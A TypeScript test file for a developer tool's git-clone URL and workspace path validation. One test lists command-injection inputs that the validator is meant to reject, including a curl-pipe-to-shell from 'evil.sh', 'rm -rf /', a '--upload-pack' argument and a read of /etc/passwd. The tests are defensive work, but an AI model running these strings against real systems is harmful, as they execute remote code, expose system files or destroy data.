import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, test } from "node:test";
import { repoName, validateUrl } from "../lib/clone.ts";
import { expandHome, validatePath } from "../lib/workspaces.ts";

/**
 * The two places a typed string reaches the system.
 *
 * `git clone` is not a downloader — it accepts transports that execute
 * commands. `ext::sh -c whoami` is a working remote and `--upload-pack=…` is a
 * working argument, so the URL box on the dashboard is a command-injection
 * surface unless something stops it. These are the assertions that say it does.
 */

const dirs: string[] = [];
after(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

function tmp(): string {
  const d = mkdtempSync(join(tmpdir(), "devcon-clone-"));
  dirs.push(d);
  return d;
}

describe("validateUrl", () => {
  test("accepts the two forms a student will paste", () => {
    for (const url of [
      "https://github.com/user/repo",
      "https://github.com/user/repo.git",
      "https://gitlab.com/group/sub-group/repo.git",
      "git@github.com:user/repo.git",
    ]) {
      assert.equal(validateUrl(url).ok, true, url);
    }
  });

  test("rejects transports that run commands", () => {
    // Each of these is a real git remote that executes something. If any one
    // returns ok, the URL box on the dashboard is a shell.
    for (const url of [
      "ext::sh -c whoami",
      "ext::bash -c 'curl evil.sh | sh'",
      "file:///etc/passwd",
      "--upload-pack=touch /tmp/pwned",
      "-u./payload",
      "ssh://user@host/repo; rm -rf /",
      "https://github.com/user/repo; whoami",
      "https://github.com/user/repo && touch /tmp/x",
      "  ",
    ]) {
      assert.equal(validateUrl(url).ok, false, `ACCEPTED: ${url}`);
    }
  });

  test("names the folder a clone will land in", () => {
    assert.equal(repoName("https://github.com/user/my-app.git"), "my-app");
    assert.equal(repoName("git@github.com:user/my-app.git"), "my-app");
    assert.equal(repoName("https://github.com/user/my-app/"), "my-app");
  });

  test("a name that would escape the clone root is refused", () => {
    // `..` as a repo name would put the clone outside ~/devcon.
    assert.equal(validateUrl("https://github.com/user/..").ok, false);
    assert.equal(validateUrl("https://github.com/user/.git").ok, false);
  });
});

describe("validatePath", () => {
  test("accepts a real directory", async () => {
    const dir = tmp();
    const r = await validatePath(dir);
    assert.equal(r.ok, true);
  });

  test("refuses a file, a missing path, a relative path and nothing", async () => {
    const dir = tmp();
    const file = join(dir, "note.txt");
    writeFileSync(file, "x");

    assert.deepEqual(await validatePath(file), {
      ok: false,
      error: "not-a-directory",
    });
    assert.deepEqual(await validatePath(join(dir, "nope")), {
      ok: false,
      error: "missing",
    });
    assert.deepEqual(await validatePath("code/project"), {
      ok: false,
      error: "not-absolute",
    });
    assert.deepEqual(await validatePath("   "), { ok: false, error: "empty" });
  });

  test("does not require a SHIP.md — that is the point of importing one", async () => {
    // A student's project has no spec yet. Refusing it would turn away exactly
    // the person this is for.
    const r = await validatePath(tmp());
    assert.equal(r.ok, true);
  });
});

describe("expandHome", () => {
  test("expands a leading ~ and leaves everything else alone", () => {
    assert.equal(expandHome("~/code/app", "/Users/x"), "/Users/x/code/app");
    assert.equal(expandHome("~", "/Users/x"), "/Users/x");
    assert.equal(expandHome("/abs/path", "/Users/x"), "/abs/path");
    // Only a leading `~/` is a home reference.
    assert.equal(expandHome("/a/~/b", "/Users/x"), "/a/~/b");
  });
});

describe("the active project", () => {
  test("round-trips, and is null before anything is opened", async () => {
    const { getActive, setActive, addWorkspace } = await import(
      "../lib/workspaces.ts"
    );
    const home = tmp();
    const active = join(home, "active.json");
    const store = join(home, "workspaces.json");
    const proj = tmp();

    assert.equal(await getActive(active, store), null);

    await addWorkspace(proj, store);
    await setActive(proj, active);
    assert.equal((await getActive(active, store))?.path, proj);
  });

  test("a folder that has since been deleted is not reported as open", async () => {
    // The work page naming a project that is not there is the same class of
    // claim this tool exists to catch.
    const { getActive, setActive, addWorkspace } = await import(
      "../lib/workspaces.ts"
    );
    const home = tmp();
    const active = join(home, "active.json");
    const store = join(home, "workspaces.json");
    const proj = tmp();

    await addWorkspace(proj, store);
    await setActive(proj, active);
    rmSync(proj, { recursive: true, force: true });

    assert.equal(await getActive(active, store), null);
  });

  test("forgetting the open project clears it", async () => {
    const { clearActiveIf, getActive, setActive, addWorkspace } = await import(
      "../lib/workspaces.ts"
    );
    const home = tmp();
    const active = join(home, "active.json");
    const store = join(home, "workspaces.json");
    const proj = tmp();

    await addWorkspace(proj, store);
    await setActive(proj, active);
    await clearActiveIf(proj, active);

    assert.equal(await getActive(active, store), null);
  });
});
